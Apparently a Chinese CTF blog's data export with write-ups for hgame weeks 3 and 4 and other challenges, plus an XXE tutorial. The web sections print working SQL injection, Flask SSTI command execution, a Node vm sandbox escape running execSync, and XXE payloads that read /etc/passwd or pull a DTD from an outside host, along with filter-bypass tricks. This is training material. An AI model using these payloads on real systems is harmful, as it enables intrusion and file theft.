123456789101112131415161718192021222324251&quot;||(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#//web_sqli1&quot;||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1))#//article,flag,users1&quot;||(updatexml(1,concat(0x7e,(select(concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;)),0x7e),1))#//real_flag_1s_here//由于输出长度限制，这里用到了正则匹配使表名完全显示1&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)),0x7e),1))#//flag&#123;26d9bb05-00be-4bc0-bfcc-03//无效信息太多导致flag无法显示，因此使用正则匹配1&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),0x7e),1))#//&#125;d8ea481f9d30-ccfb-0cb4-eb00-50//由于flag长度限制因此逆序输出后半部分flag [CSCCTF 2019 Qual]FlaskLight题目提示我们ssti，接着审查元素发现GET一个search元素，构建payload查找子类： 1&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()&#125;&#125; 接着用subprocess.Popen进行命令执行，payload： 1&#123;&#123;&#123;&#125;.__class__.__bases__[0].__subclasses__()[258](&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;,shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"【hgame week4】write up","slug":"【hgame-week4】write-up","date":"2022-02-18T10:40:37.000Z","updated":"2022-02-18T13:29:48.942Z","comments":true,"path":"2022/02/18/【hgame-week4】write-up/","link":"","permalink":"http://example.com/2022/02/18/%E3%80%90hgame-week4%E3%80%91write-up/","excerpt":"前言 四周的比赛终于结束了，最后总计拿了9676分，位列20名。","text":"前言 四周的比赛终于结束了，最后总计拿了9676分，位列20名。 CRYPTOECC给了个sage文件，审计代码： 123456789101112131415161718192021222324252627from Crypto.Util.number import getPrimefrom libnum import s2nfrom secret import flagp = getPrime(256)a = getPrime(256)b = getPrime(256)E = EllipticCurve(GF(p),[a,b])m = E.random_point()G = E.random_point()k = getPrime(256)K = k * Gr = getPrime(256)c1 = m + r * Kc2 = r * Gcipher_left = s2n(flag[:len(flag)//2]) * m[0]cipher_right = s2n(flag[len(flag)//2:]) * m[1]print(f&quot;p = &#123;p&#125;&quot;)print(f&quot;a = &#123;a&#125;&quot;)print(f&quot;b = &#123;b&#125;&quot;)print(f&quot;k = &#123;k&#125;&quot;)print(f&quot;E = &#123;E&#125;&quot;)print(f&quot;c1 = &#123;c1&#125;&quot;)print(f&quot;c2 = &#123;c2&#125;&quot;)print(f&quot;cipher_left = &#123;cipher_left&#125;&quot;)print(f&quot;cipher_right = &#123;cipher_right&#125;&quot;) 发现是一个椭圆加密的逻辑，生成一个椭圆后取随机一点作为明文，再根据逻辑生成两个密文。而flag是根据明文点的x，y轴进行加密，flag左半边乘x轴获得flag密文1，右半边乘y轴获得密文2，根据逻辑写解密脚本： 123456789101112131415p = 74997021559434065975272431626618720725838473091721936616560359000648651891507a = 61739043730332859978236469007948666997510544212362386629062032094925353519657b = 87821782818477817609882526316479721490919815013668096771992360002467657827319k = 93653874272176107584459982058527081604083871182797816204772644509623271061231E = EllipticCurve(GF(p),[a,b])c1 = E(14455613666211899576018835165132438102011988264607146511938249744871964946084,25506582570581289714612640493258299813803157561796247330693768146763035791942)c2 = E(37554871162619456709183509122673929636457622251880199235054734523782483869931,71392055540616736539267960989304287083629288530398474590782366384873814477806)m = c1-k*c2cipher_left = 68208062402162616009217039034331142786282678107650228761709584478779998734710cipher_right = 27453988545002384546706933590432585006240439443312571008791835203660152890619flag1=cipher_left/m[0]flag2=cipher_right/m[1]print(hex(flag1))print(hex(flag2)) 获得结果后解16进制得到flag： PRNG名字就告诉我们是伪随机，先看加密脚本： 1234567891011import refrom random import randrangefrom libnum import s2nfrom secret import flagfrom PRNG import PRNGmt = PRNG(randrange(0, 1 &lt;&lt; 32))print([mt() for _ in range(624)])print([part ^ mt() for part in map(s2n, re.findall(&quot;.&#123;1,4&#125;&quot;, flag))]) 相当简单粗暴，给了我们624位伪随机值，我们要根据这624位推出接下来的伪随机值，而密文每四位flag与接下来的伪随机值进行异或，我们直接借用MT19937Predictor库编写脚本： 1234567891011121314151617import randomfrom mt19937predictor import MT19937Predictorfrom libnum import n2spredictor = MT19937Predictor()list=[num*624]for i in list: predictor.setrandbits(i, 32)list2=[3437104340, 508103176, 1635844121, 878522509, 1923790547, 1727955782, 1371509208, 3182873539, 156878129, 1757777801, 1472806960, 3486450735, 2307527058, 2950814692, 1817110380, 372493821, 729662950, 2366747255, 774823385, 387513980, 1444397883]flag = b&quot;&quot;for j in list2: key = predictor.getrandbits(32) flag += n2s(j ^ key) print(flag) 得到flag： MISC摆烂这周唯一做出来的misc，太菜了还是。首先下载下来是一个被加密的压缩包，binwalk发现藏了一张图片，foremost提取出来。 观察010，发现是一张apng： 利用网站分离后是两张长得一模一样但是大小不一样的图片，判断是盲水印，利用工具提取盲水印： 得到压缩包密码：4C*9wfg976 解压出来发现是二维码，拼接： 最后扫描出来一段文字，但是用QR Reserch扫描时发现文字之间存在问号，判断零宽隐写，在线网站解密得到flag： At0m的给你们的(迟到的)情人节礼物（赛后）打开压缩包，一个视频是web3的hint，一个视频是avi格式，猜测MSU隐写，hint视频中的切屏印证了这一猜测： 接着寻找passcode，010查看压缩包发现藏着一个hide.txt，用7z打开查看： 12秋名山车神Atom开车啦4 up left down up right down up left up down right down up left down up right down up left up down right down up left down up right up down left up down right down up left down up right down up left up down right down up left up down down up up down right down up left up down right up down left up down right down up left up down right up 做题时做到这里被卡死了，看了wp才发现上下左右是代表换挡方向，麻了。4进制编码，油门代表保持，解得passcode为6557255，解密获得flag： 1hgame&#123;Q1ng_R3n_J1e_Da_Sh4_CTF&#125; REVERSEezvm搞清楚vm的逻辑就行了，具体逻辑参考官方wp吧，脚本破解： 12345678xor_keys = [94, 70, 97, 67, 14, 83, 73, 31, 81, 94, 54, 55, 41, 65, 99, 59, 100,59, 21, 24, 91, 62, 34, 80, 70, 94, 53, 78, 67, 35, 96, 59]plain_text = []cipher = [142, 136, 163, 153, 196, 165, 195, 221, 25, 236, 108, 155, 243, 27, 139,91, 62, 155, 241, 134, 243, 244, 164, 248, 248, 152, 171, 134, 137, 97, 34, 193]for i in range(0,32): plain_text.append(chr((cipher[i]^xor_keys[i])//2))print(&#x27;&#x27;.join(plain_text)) 得到flag： 1hgame&#123;Ea$Y-Vm-t0-PrOTeCT_cOde!!&#125; WEBMarkdown Online（赛后）这题想出来前一半，后一半是绕rce的一个沙盒vm逃逸，当时做的时候没找到payload，不太应该。 首先看登录逻辑： 1234567891011121314function LoginController(req, res) &#123; if (req.body.username === &quot;admin&quot; &amp;&amp; req.body.password.length === 16) &#123; try &#123; req.body.password = req.body.password.toUpperCase() if (req.body.password !== &#x27;54gkj7n8uo55vbo2&#x27;) &#123; return res.status(403).json(&#123;msg: &#x27;invalid username or password&#x27;&#125;) &#125; &#125; catch (__) &#123;&#125; req.session[&#x27;unique_id&#x27;] = randString.generate(16) res.json(&#123;msg: &#x27;ok&#x27;&#125;) &#125; else &#123; res.status(403).json(&#123;msg: &#x27;login failed&#x27;&#125;) &#125;&#125; 将我们输入的字符串转大写后与54gkj7n8uo55vbo2进行比较，如果相等才能登陆成功。但这显然是不可能的，但我们注意到关键点在于，这个比较实在异常捕获中进行的，也就是说我们可以让语句出错达到绕过的效果，因此我们构建payload： 成功绕过，进入md界面。这里是利用markdown-it不转义html标签的条件，构造一个恶意的script标签，利用其中的代码来逃逸vm沙箱并实现RCE，同时需要bypass来绕过waf。构建payload： 1234&lt;script&gt;var h=&#x27;child_p&#x27;;var e=&#x27;rocess&#x27;;var i=[h,e].join(&#x27;&#x27;);x=clearImmediate[`$&#123;`$&#123;`constructo`&#125;r`&#125;`][`$&#123;`$&#123;`constructo`&#125;r`&#125;`][`$&#123;`$&#123;`constructo`&#125;r`&#125;`]([`$&#123;`$&#123;`return proces`&#125;s`&#125;`])();y=x.mainModule.require(i);z=y.execSync(&#x27;cat /flag&#x27;).toString();document.write(z);&lt;/script&gt; 得到flag： 只能说nodejs的沙盒逃逸确实是知识盲区，这波是被教育了。 Comment根据提示下载www.zip，获取源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596&lt;?phprequire &#x27;./init.php&#x27;;require_once &#x27;./db.php&#x27;;libxml_disable_entity_loader(false);function waf($str): bool &#123; if (preg_match(&#x27;/file|glob|http|dict|gopher|php|ftp|ssh|phar/i&#x27;, $str)) &#123; return true; &#125; return false;&#125;function save() &#123; if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] != &#x27;POST&#x27;) &#123; echo json_encode([&#x27;error&#x27; =&gt; &#x27;wrong method&#x27;]); return; &#125; $data = file_get_contents(&#x27;php://input&#x27;); if (waf($data)) &#123; http_response_code(403); echo json_encode([&#x27;error&#x27; =&gt; &#x27;Hacker!&#x27;]); return; &#125; $id = $_SESSION[&#x27;unique_id&#x27;]; $db = getDB(); $stmt = $db-&gt;prepare(&#x27;INSERT INTO comments (sender,content) VALUES (?,?)&#x27;); $stmt-&gt;execute([$id, $data]); if ($stmt-&gt;rowCount() != 0) &#123; echo json_encode([&#x27;msg&#x27; =&gt; &#x27;success&#x27;]); &#125; else &#123; http_response_code(500); echo json_encode([&#x27;error&#x27; =&gt; &#x27;failed to create records&#x27;]); &#125;&#125;function parseXML($str) &#123; $dom = new DOMDocument(); try &#123; $dom-&gt;loadXML($str, LIBXML_NOENT | LIBXML_DTDLOAD); &#125; catch (Exception $e) &#123; http_response_code(400); echo json_encode([&#x27;error&#x27; =&gt; &#x27;invalid xml data&#x27;]); die(); &#125; $attrs = simplexml_import_dom($dom); if (!isset($attrs-&gt;content)) &#123; http_response_code(400); echo json_encode([&#x27;error&#x27; =&gt; &#x27;content is empty&#x27;]); die(); &#125; if (waf($attrs-&gt;sender) || waf($attrs-&gt;content)) &#123; http_response_code(403); echo json_encode([&#x27;error&#x27; =&gt; &#x27;Hacker!&#x27;]); die(); &#125; if ($attrs-&gt;sender == &#x27;admin&#x27; &amp;&amp; !preg_match(&#x27;/admin/i&#x27;, $str)) &#123; $flag = &#x27;hgame&#123;xxxxx&#125;&#x27;; $attrs-&gt;content = $flag; &#125; return $attrs;&#125;function get() &#123; $id = $_SESSION[&#x27;unique_id&#x27;]; $db = getDB(); $stmt = $db-&gt;prepare(&#x27;SELECT * FROM comments WHERE sender=?&#x27;); $stmt-&gt;execute([$id]); $data = $stmt-&gt;fetchAll(); $result = []; foreach ($data as $key =&gt; $val) &#123; array_push($result, parseXML($val[&#x27;content&#x27;])); &#125; echo json_encode($result);&#125;switch ($_GET[&#x27;action&#x27;]) &#123; case &#x27;get&#x27;: get(); break; case &#x27;add&#x27;: save(); break; case &#x27;info&#x27;: echo json_encode([&#x27;unique_id&#x27; =&gt; $_SESSION[&#x27;unique_id&#x27;]]); break; default: http_response_code(400); echo json_encode([&#x27;error&#x27; =&gt; &#x27;no such action&#x27;]); break;&#125; 审计代码发现是传入xml，且不能传入伪协议。而获取flag的方式是令传入的标签&lt;sender&gt;内的值为admin，但是传入的内容不能出现admin，因此利用xxe做拼接传入就可以了： 得到flag： FileSystem这题考察的是go语言，首先给了我们源码： 123456789101112131415161718package mainimport ( &quot;log&quot; &quot;net/http&quot;)func fileHandler(w http.ResponseWriter, r *http.Request) &#123; http.FileServer(http.Dir(&quot;./&quot;)).ServeHTTP(w, r)&#125;func main() &#123; http.HandleFunc(&quot;/&quot;, fileHandler) http.HandleFunc(&quot;/there_may_be_a_flag&quot;, func(w http.ResponseWriter, r *http.Request) &#123; w.Write([]byte(`No! You can&#x27;t see the flag!`)) &#125;) log.Fatal(http.ListenAndServe(&quot;:8889&quot;, nil))&#125; 虽然没学过go，但是不妨碍读，大概意思就是开了个/there_may_be_a_flag路由要我们访问，但是直接访问的话会被拒绝。这里我们要用到golang的一个安全漏洞，详细参考下面的博客：golang 的一些安全问题 对于CONNECT请求，path和host都不会改变其内容,因此我们构建payload，获取flag：","categories":[{"name":"write up","slug":"write-up","permalink":"http://example.com/categories/write-up/"}],"tags":[{"name":"-ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"XXE的学习","slug":"XXE的学习","date":"2022-02-13T02:33:57.000Z","updated":"2022-02-14T07:10:07.472Z","comments":true,"path":"2022/02/13/XXE的学习/","link":"","permalink":"http://example.com/2022/02/13/XXE%E7%9A%84%E5%AD%A6%E4%B9%A0/","excerpt":"前言 打hgame的时候打出来一个新知识点，赶紧记录下这个漏洞。不过在学习xxe之前，我们要先认识xml。","text":"前言 打hgame的时候打出来一个新知识点，赶紧记录下这个漏洞。不过在学习xxe之前，我们要先认识xml。 认识xml什么是xmlXML（EXtensible Markup Language），即可扩展标记语言，是一种标记语言，其标签没有预定义，您需要自行定义标签，是W3C的推荐标准。其于HTML的区别是： HTML 被设计用来显示数据 XML 被设计用来传输和存储数据 XML标签根据自己主观定义，不像HTML是被预定义好的 下面这个便是典型的xml文档： 12345678910&lt;!--XML声明--&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!--DTD，可选--&gt; &lt;!DOCTYPE any[ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;!--文档元素--&gt; &lt;foo&gt;&amp;xxe;&lt;/foo&gt; 什么是DTDDTD（Document Type Definition），即文档类型定义，作用是定义XML文档的合法构建模块。 DTD声明DTD可被成行地声明于XML文档中，也可作为一个外部引用。 内部DOCTYPE声明：1&lt;!DOCTYPE 根元素 [元素声明]&gt; 例如： 123456&lt;!DOCTYPE any[ &lt;!ENTITY a &quot;admin&quot;&gt;]&gt;&lt;sender&gt;&amp;a&lt;/sender&gt;&lt;!-- admin --&gt; 外部文档声明:1&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; 例如： 12345678910&lt;!DOCTYPE any[ &lt;!ENTITY % a SYSTEM &quot;http://xx.xx.xx.xx/xml.dtd&quot;&gt; %a;]&gt;&lt;flag&gt;&amp;b&lt;/flag&gt;&lt;!-- dGhpc18xc180X2ZMYTk= --&gt;xx.xx.xx.xx/xml.dtd:&lt;!ENTITY b SYSTEM &quot;data://text/plain;base64,dGhpc18xc180X2ZMYTk=&quot;&gt; DTD实体DTD实体一般分为三种：内部实体、参数实体以及外部实体。 内部实体：1&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; 例如： 123456&lt;!DOCTYPE any[ &lt;!ENTITY a &quot;admin&quot;&gt;]&gt;&lt;sender&gt;&amp;a&lt;/sender&gt;&lt;!-- admin --&gt; 外部实体：1&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 例如： 123456&lt;!DOCTYPE any[ &lt;!ENTITY a SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;]&gt;&lt;flag&gt;&amp;a&lt;/flag&gt;&lt;!-- dGhpc18xc180X2ZMYTk= --&gt; 参数实体：12&lt;!ENTITY %实体名称 &quot;实体的值&quot;&gt;&lt;!ENTITY %实体名称 SYSTEM &quot;URI&quot;&gt; 例如： 123456789&lt;!DOCTYPE any[ &lt;!ENTITY % a &quot;&lt;!ENTITY b &quot;admin&quot;&gt;&quot;&gt; &lt;!ENTITY % c &quot;&lt;!ENTITY d SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;&gt;&quot;&gt; %a; %c;]&gt;&lt;sender&gt;&amp;b;&amp;d&lt;/sender&gt;&lt;!-- admindGhpc18xc180X2ZMYTk= --&gt; 注意：参数实体用% name声明，引用时用%name;，只能在DTD中申明，DTD中引用。 外部实体引用可支持多种协议： XXE攻击时的绕过ENTITY、SYSTEM、file等关键词过滤编码转化为UTF-16绕过： 1cat payload.xml | iconv -f utf-8 -t utf-16be &gt; payload.8-16be.xml http被过滤data伪协议绕过、html实体编码绕过、文件上传等等，以data伪协议为例： 12345678910&lt;?xml version=&quot;1.0&quot;&gt;&lt;!DOCTYPE any[ &lt;!ENTITY % a SYSTEM &quot;data://text/plain;base64,PCFFTlRJVFkgJSBiIFNZU1RFTSAnaHR0cDovL3h4Lnh4Lnh4Lnh4L3htbC5kdGQnPg==&quot;&gt; %a; %b;]&gt;&lt;flag&gt;&amp;a;&lt;/flag&gt;&lt;!--编码内容--&gt;&lt;!ENTITY % b SYSTEM &#x27;http://xx.xx.xx.xx/xml.dtd&#x27;&gt; [NCTF2019]Fake XML cookbook这题还是比较简单的，基本简单了解下xml就可以做出来了。 进入网页发现是要进行登录，尝试抓包发现POST部分是xml： 1&lt;user&gt;&lt;username&gt;1&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt; 因此直接构造外部引用读取： 12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE any[ &lt;!ENTITY a SYSTEM &quot;file:///flag&quot;&gt; ]&gt;&lt;user&gt;&lt;username&gt;&amp;a;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt; 读取flag： 12&lt;result&gt;&lt;code&gt;0&lt;/code&gt;&lt;msg&gt;flag&#123;e9ac9a2a-8a06-47c9-8cb1-0dd2ecbeb01f&#125;&lt;/msg&gt;&lt;/result&gt; 总结这篇博客简单总结了下xxe的基础知识，实际上，xxe还有其他的用途，例如探测内网、RCE、DOS等都可以用上，因此xxe还是十分好用的。","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -XXE","slug":"web-XXE","permalink":"http://example.com/tags/web-XXE/"}]},{"title":"【hgame week3】write up","slug":"【hgame-week3】write-up","date":"2022-02-11T13:27:12.000Z","updated":"2022-02-11T13:27:57.177Z","comments":true,"path":"2022/02/11/【hgame-week3】write-up/","link":"","permalink":"http://example.com/2022/02/11/%E3%80%90hgame-week3%E3%80%91write-up/","excerpt":"前言第三周题量不多，还是没摆烂摆下去。","text":"前言第三周题量不多，还是没摆烂摆下去。 CRYPTOBlock Cipher考点在于字节流转换以及分组加密: 12345678910111213141516171819202122232425262728293031import operatorimport randomimport refrom functools import reducefrom secret import flagdef pad(s): padding_length = (8 - len(s)) % 8 return s + chr(padding_length) * padding_lengthdef xor(a, b): assert len(a) == len(b) return bytes(map(operator.xor, a, b))def encrypt(s): iv = bytes(random.randint(0, 255) for _ in range(8)) key = bytes(random.randint(0, 255) for _ in range(8)) parts = list(map(str.encode, map(pad, re.findall(r&#x27;.&#123;1,8&#125;&#x27;, s)))) results = [] for index, part in enumerate(parts): results.append(reduce(xor, [part, iv if index == 0 else results[-1], key])) return iv, key, resultsiv, key, parts = encrypt(flag)print(f&quot;iv = &#123;iv&#125;&quot;)print(f&quot;key = &#123;key&#125;&quot;)print(f&quot;parts = &#123;parts&#125;&quot;) 加密逻辑就是将flag分成8位1part，然后第一位和iv和key异或，第二位和key以及第一次异或结果，以此类推。因此我们只需要将字节流转换回整形进行反向异或即可。编写脚本： 123456789101112131415iv = b&#x27;Up\\x14\\x98r\\x14%\\xb9&#x27;key = b&#x27;\\r\\xe8\\xb86\\x9c33^&#x27;parts = [b&#x27;0\\xff\\xcd\\xc3\\x8b\\\\T\\x8b&#x27;, b&#x27;RT\\x1e\\x89t&amp;\\x17\\xbd&#x27;, b&#x27;\\x1a\\xee\\x8d\\xd6\\x9b&gt;w\\x8c&#x27;, b&#x27;9CT\\xb3^pF\\xd0&#x27;]a = int.from_bytes(iv, byteorder=&#x27;big&#x27;)b = int.from_bytes(key, byteorder=&#x27;big&#x27;)c = []for i in parts: c.append(int.from_bytes(i, byteorder=&#x27;big&#x27;))for j in range(0,3): flag = c[3-j]^c[2-j]^b print(hex(flag))d = c[0]^a^bprint(hex(d)) 将四次输出结果放过来解码十六进制即可得到flag： Multi Prime RSARSA的多素数加密，上加密脚本： 123456789101112131415161718192021from Crypto.Util.number import getPrimefrom gmpy2 import invertfrom libnum import s2nfrom secret import flag, get_phip = getPrime(256)q = getPrime(256)r = getPrime(256)s = getPrime(256)n = p ** 2 * q ** 3 * r ** 5 * s ** 7phi = get_phi(p, q, r, s)e = 65537c = pow(s2n(flag), e, n)print(f&quot;p = &#123;p&#125;&quot;)print(f&quot;q = &#123;q&#125;&quot;)print(f&quot;r = &#123;r&#125;&quot;)print(f&quot;s = &#123;s&#125;&quot;)print(f&quot;n = &#123;n&#125;&quot;)print(f&quot;e = &#123;e&#125;&quot;)print(f&quot;c = &#123;c&#125;&quot;) 这里要运用到欧拉函数的计算方法： 根据上面的方法直接写脚本解RSA： 12345678910111213141516import libnump = 109056753224725357860050862987465749131702509174531265860789564184166504627089q = 64871884070495743485110397060920534297122908609816622599229579748089451488127r = 73817195552029165561107245309535744382442021553254903166961729774806232509583s = 89907870347457693114161779597928900080173728317019344960807644151097370118553n = 337945247991531188630780631650822497552908401425959508214145019590891175999570651678385514599227649321033438265588883204645721459926338248032512615537333971869461679586403649697114789385472197685140603238299768873935137939123021910982793481655218061907401584383081422244812725080939394854989735528833013780919908024635812696998644603525843637686545709789908672408993923182946718279531020289767042649725545073526307769817097790005360720650079676982379162926484355121626302801800589993422729725583400678081766553017405965706770238634252836827793877622715474210575752508172785712202444441372140501379422725172250199713113954442223362073485143579617841236442644760494913432967541691532709842303408702693199269606594116690052170245340072114122287646793344327315326489574192325790848798131621842606487734721409882742631176999703502149639410263361145441889337623403361569958342141903891414217371443118527025041591219747780100510414268546884029077010164415049298406632069845430841542680166802473749172801804659277821899576403669845353379213803866969800665351300325701817179936198902427032684058452719607840314873315299975603264092020097224735237221994922702705781103002327285724125001893421030923788361576161461965707958695720464547129911053732747399113017747456439027947305796290572816318795181398935020951025833913e = 65537c = 281020926647419736778465777714512241989738235339105762863874725870511725155101862585192241287617168165290485944476735304459717602798728005687755713662466866091315959960168862035396245078850168822145228676116894754613436735897122137945552880864031115366493898382809812977280234389519365119627504653135151731589924405933589175425427189436855517194951589952822691774400942764910734054237756669945324833759799471068481769516338068810710333940167779043544371586185132920304774984746129764220081092726473696111126293966890901487735046101991609292612206984184161394385767762455321150541601949740631911175736268756408775307673610842645555513631617648877296855194327486811545670357137463942744122553468603244298691801028147147418563982169678640270746871085722092365159546820433098926679284504740402248142173715649451061037156261913601096905601577932894877435316535261789072594174871292814951406337447799051502635390866434813419165738873787323716033378045850292413169255965421404580559241351577058726176436504950558398769061998430771982995850759810867299728407860522399699076192754977454139708618158667289120827143703464056583125568576691058753072898162981956883451252542611323974071518397220203389962420073122776649094369816178685947397943358134020598211306649724455966463885765977564934172273334309312046278116760547flag = &#x27;&#x27;phi = (p**2-p)* (q**3-q**2) * (r**5-r**4) * (s**7-s**6)d = libnum.invmod(e,phi)flag = libnum.n2s(pow(c,d,n))print(flag) 解得flag： RSA Attack 3这题要利用到RSA中的wiener-attack，特征是e的值非常大，这就导致了d的值会比较小，因此可以利用相关工具破解。这里从网上码了一个完整的脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import gmpy2import libnumdef continuedFra(x, y): cf = [] while y: cf.append(x // y) x, y = y, x % y return cfdef gradualFra(cf): numerator = 0 denominator = 1 for x in cf[::-1]: numerator, denominator = denominator, x * denominator + numerator return numerator, denominatordef solve_pq(a, b, c): par = gmpy2.isqrt(b * b - 4 * a * c) return (-b + par) // (2 * a), (-b - par) // (2 * a)def getGradualFra(cf): gf = [] for i in range(1, len(cf) + 1): gf.append(gradualFra(cf[:i])) return gfdef wienerAttack(e, n): cf = continuedFra(e, n) gf = getGradualFra(cf) for d, k in gf: if k == 0: continue if (e * d - 1) % k != 0: continue phi = (e * d - 1) // k p, q = solve_pq(1, n - phi + 1, n) if p * q == n: return dn= 507419170088344932990702256911694788408493968749527614421614568612944144764889717229444020813658893362983714454159980719026366361318789415279417172858536381938870379267670180128174798344744371725609827872339512302232610590888649555446972990419313445687852636305518801236132032618350847705234643521557851434711389664130274468354405273873218264222293858509477860634889001898462547712800153111774564939279190835857445378261920532206352364005840238252284065587291779196975457288580812526597185332036342330147250312262816994625317482869849388424397437470502449815132000588425028055964432298176942124697105509057090546600330760364385753313923003549670107599757996810939165300581847068233156887269181096893089415302163770884312255957584660964506028002922164767453287973102961910781312351686488047510932997937700597992705557881172640175117476017503918294534205898046483981707558521558992058512940087192655700351675718815723840568640509355338482631416345193176708501897458649841539192993142790402734898948352382350766125000186026261167277014748183012844440603384989647664190074853086693408529737767147592432979469020671772152652865219092597717869942730499507426269170189547020660681363276871874469322437194397171763927907099922324375991793759e= 77310199867448677782081572109343472783781135641712597643597122591443011229091533516758925238949755491395489408922437493670252550920826641442189683907973926843505436730014899918587477913032286153545247063493885982941194996251799882984145155733050069564485120660716110828110738784644223519725613280140006783618393995138076030616463398284819550627612102010214315235269945251741407899692274978642663650687157736417831290404871181902463904311095448368498432147292938825418930527188720696497596867575843476810225152659244529481480993843168383016583068747733118703000287423374094051895724494193455175131120243097065270804457787026492578916584536863548445813916819417857064037664101684455000184987531252344582899589746272173970083733130106407810619258077266603898529285634495710846838011858287024329514491058790557305041389614650730267774482954666726949886313386881066593946789460028399523245777171320319444673551268379126203862576627540177888290265714418064334752499940587750374552330008143708562065940245637685833371348603338834447212248648869514585047871442060412622164276894766238383894693759347590977926306581080390685360615407766600573527565016914830132066428454738135380178959590692145577418811677639050929791996313180297924833690095c= 165251729917394529793163344300848992394021337429474789711805041655116845722480301677817165053253655027459227404782607373107477419083333844871948673626672704233977397989843349633720167495862807995411682262559392496273163155214888276398332204954185252030616473235814999366132031184631541209554169938146205402400412307638567132128690379079483633171535375278689326189057930259534983374296873110199636558962144635514392282351103900375366360933088605794654279480277782805401749872568584335215630740265944133347038070337891035560658434763924576508969938866566235926587685108811154229747423410476421860059769485356567301897413767088823807510568561254627099309752215808220067495561412081320541540679503218232020279947159175547517811501280846596226165148013762293861131544331444165070186672186027410082671602892508739473724143698396105392623164025712124329254933353509384748403154342322725203183050328143736631333990445537119855865348221215277608372952942702104088940952142851523651639574409075484106857403651453121036577767672430612728022444370874223001778580387635197325043524719396707713385963432915855227152371800527536048555551237729690663544828830627192867570345853910196397851763591543484023134551876591248557980182981967782409054277224d=wienerAttack(e, n)m=pow(c, d, n)print(libnum.n2s(m).decode()) 得出flag： MISC卡中毒内存取证，这次也是第一次上手，工具装了蛮久的，有点麻，但是题目本身不难。 首先基本操作，查看系统信息： 看出操作系统是win7sp1x64，接着根据提示内容，查看ie浏览记录： 发现flag文件，格式为7z，搜索文件位置： 根据文件位置获取文件： 打开后发现一个WannaRen病毒加密的txt文件： 利用火绒WannaRen解密工具进行解密后，发现txt文件中是一串新与佛论禅密码，解码即可得到flag： 谁不喜欢猫猫呢附件是一张甘城猫猫的新图，爱了爱了。010翻到最后发现藏有压缩包，直接改后缀提取两个txt文件： 发现是两个txt文件中都是9个数字，这里尝试把两个文档中位置对应的数字加起来转换成2进制发现可以得出flag头，因此进行转换： 123456list1 = [776686, 749573, 6395443, 2522866, 279584, 587965, 4012670, 1645156, 2184634]list2 = [6065523, 6419830, 1421837, 5103682, 5963053, 2842996, 1113825, 1594064, 4578755]for i in range(0,9): result = list1[i]+list2[i] print(&#x27;&#123;:024b&#125;&#x27;.format(result)) 结果： 做一次二进制转字符串得到flag： 这里做下赛后补充，上述做法是直接尝试出来的，但是预期解法中会直接提示你要做加法运算。 首先发现图上有异常像素，用python脚本进行提取： 12345678910111213from PIL import Imagex, y = 0, 0a = Image.open(&quot;cat.png&quot;)flag = Image.new(&quot;RGB&quot;, (214, 214))for w in range(4, a.size[0] -10 , 11): for h in range(4, a.size[1]-10 , 11): r, g, b, _ = a.getpixel((w + 1, h + 1)) rgba = flag.putpixel((x, y), (r, g, b)) y += 1 x += 1 y = 0flag.save(&quot;data.png&quot;) 得到图1： 观察发现每个带颜色的点都间隔4像素点，由此编出脚本： 123456789101112131415161718from PIL import Imageimg = Image.open(&#x27;26.png&#x27;)width, height = img.sizepixs_list = []for w in range(2, width, 5): for h in range(2, height, 5): pix = img.getpixel((w, h)) pixs_list.append(pix)new_width, new_height = 43, 43new_img = Image.new(&#x27;RGB&#x27;, (new_width, new_height))idx = 0for n_w in range(new_width): for n_h in range(new_height): new_img.putpixel((n_w, n_h), pixs_list[idx]) idx += 1new_img.save(&#x27;27.png&#x27;)new_img.show() 得到图2 wp说这里运用到的是cat变化，wp里给的脚本： 12345678910def arnold_decode(image, a, b): decode_image = np.zeros(shape=image.shape) h, w = image.shape[0], image.shape[1] N = h for ori_x in range(h): for ori_y in range(w): new_x = ((a*b+1)*ori_x + (-b)* ori_y)% N new_y = ((-a)*ori_x + ori_y) % N decode_image[new_x, new_y, :] = image[ori_x, ori_y, :] return decode_image 网上大佬的脚本： 1234567891011121314151617181920from PIL import Imageimg = Image.open(&#x27;ok1.png&#x27;)if img.mode == &quot;P&quot;: img = img.convert(&quot;RGB&quot;)assert img.size[0] == img.size[1]dim = width, height = img.sizest = 1a = 9b = 39for _ in range(st): with Image.new(img.mode, dim) as canvas: for nx in range(img.size[0]): for ny in range(img.size[0]): y = (ny - nx * a) % width x = (nx - y * b) % height canvas.putpixel((y, x), img.getpixel((ny, nx)))canvas.show()canvas.save(&#x27;28.png&#x27;) 得到图3： npiet解密： 得出加法运算结论。 